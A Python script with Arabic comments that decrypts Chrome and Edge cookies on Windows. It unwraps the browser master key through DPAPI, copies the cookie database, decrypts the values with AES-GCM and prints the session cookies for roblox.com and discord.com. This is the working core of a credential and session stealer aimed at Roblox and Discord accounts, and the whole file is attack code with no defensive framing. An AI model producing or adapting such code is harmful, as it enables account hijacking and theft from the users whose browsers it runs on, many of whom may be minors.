import os
import json
import base64
import sqlite3
import shutil
import tempfile
from Crypto.Cipher import AES
import win32crypt # لتفكيك تشفير ويندوز DPAPI

def get_master_key(path):
    try:
        local_state_path = os.path.join(path, "..", "..", "Local State")
        if not os.path.exists(local_state_path):
            return None
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = json.load(f)
        encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        encrypted_key = encrypted_key[5:] # إزالة بادئة DPAPI
        return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
    except Exception:
        return None

def decrypt_val(buff, master_key):
    try:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)[:-16].decode()
        return decrypted_pass
    except Exception:
        return ""

def scan_browser_cookies():
    user_profile = os.environ.get("USERPROFILE", "")
    browsers = {
        "Chrome": os.path.join(user_profile, "AppData", "Local", "Google", "Chrome", "User Data"),
        "Edge": os.path.join(user_profile, "AppData", "Local", "Microsoft", "Edge", "User Data")
    }

    print("[*] بدء الفحص الحقيقي والعميق لقواعد بيانات المتصفحات...\n" + "="*60)

    for browser_name, data_path in browsers.items():
        default_path = os.path.join(data_path, "Default")
        if not os.path.exists(default_path):
            continue
            
        master_key = get_master_key(default_path)
        cookies_path = os.path.join(default_path, "Network", "Cookies")
        
        if not os.path.exists(cookies_path):
            # محاولة المسار القديم
            cookies_path = os.path.join(default_path, "Cookies")
            if not os.path.exists(cookies_path):
                continue

        # نسخ الملف مؤقتاً لتجنب خطب قفل الملف (Database Locked)
        temp_dir = tempfile.gettempdir()
        temp_cookie_path = os.path.join(temp_dir, f"cookies_{browser_name}.db")
        try:
            shutil.copy2(cookies_path, temp_cookie_path)
        except Exception:
            continue

        try:
            conn = sqlite3.connect(temp_cookie_path)
            cursor = conn.cursor()
            # البحث عن كوكيز روبلوكس وتطبيقات أخرى
            cursor.execute("SELECT host_key, name, value, encrypted_value FROM cookies WHERE host_key LIKE '%roblox.com%' OR host_key LIKE '%discord.com%'")
            
            for host_key, name, value, encrypted_value in cursor.fetchall():
                val = value
                if not val and encrypted_value and master_key:
                    val = decrypt_val(encrypted_value, master_key)
                
                if val:
                    print(f"[+] [{browser_name}] Host: {host_key} | Name: {name}")
                    print(f"    > Value: {val}\n")
                    
            conn.close()
        except Exception as e:
            pass
            
        try:
            os.remove(temp_cookie_path)
        except:
            pass

    print("="*60 + "\n[*] انتهى الفحص العميق.")

if __name__ == "__main__":
    scan_browser_cookies()
